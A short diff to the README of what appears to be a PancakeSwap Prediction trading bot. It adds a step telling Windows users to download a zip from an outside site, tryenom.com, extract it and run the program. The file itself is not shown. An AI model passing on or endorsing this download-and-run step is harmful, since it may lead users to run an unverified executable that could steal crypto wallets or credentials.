@@ -11,6 +11,11 @@
 2. Extract the bot program from the zip archive and run it.
 3. Enjoy!
 
+## 💡 Ready click-to-run with UI version for Windows 🥞
+1. Download the [Easy run with UI version](https://tryenom.com/predict).
+2. Extract the bot program from the zip archive and run it.
+3. Enjoy!
+
 or
 
 ## 💡 PancakeSwap Prediction v4.1 Bot Installation
